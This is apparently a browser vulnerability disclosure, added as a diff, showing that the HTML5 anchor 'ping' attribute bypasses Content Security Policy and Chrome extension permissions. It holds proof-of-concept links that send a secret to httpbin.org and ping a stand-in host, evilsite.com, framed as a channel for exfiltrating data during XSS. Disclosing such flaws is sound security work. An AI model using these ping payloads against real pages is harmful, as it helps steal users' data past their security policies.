@@ -1,0 +1,37 @@
+The HTML5 Anchor Elements Ping attribute violates both set Content Security Policy and Chrome Extensions manifest permissions settings.
+The Ping url is allowed to connect regardless of Content Security Policy as in the example below:
+
+<!DOCTYPE html>
+<head>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'none';">
+</head>
+<body>
+<a href="#done" ping="http://httpbin.org/post?secret=goes_here">click here to exploit</a>
+</body>
+
+Same goes when loaded as an Chrome Extension:
+
+# cat chrome-ext/manifest.json
+{
+  "manifest_version": 2,
+
+  "name": "ping permission test",
+  "description": "ping permission test",
+  "version": "0.1",
+
+  "browser_action": {
+    "default_icon": "icon.png",
+    "default_popup": "popup.html"
+  },
+  "permissions": [
+  ]
+}
+
+# cat chrome-ext/popup.html:
+<!DOCTYPE html>
+<body>
+<a href="#done" ping="http://evilsite.com/ping">click here to exploit</a>
+</body>
+
+An attacker can use this as a data transportation method as part of an XSS attack on CSP restricted pages or similar.
+Tested on Google Chrome Version 46.0.2490.86 (64-bit) for MacOS 10.11.1 and Version 46.0.2490.86 m for Windows 7
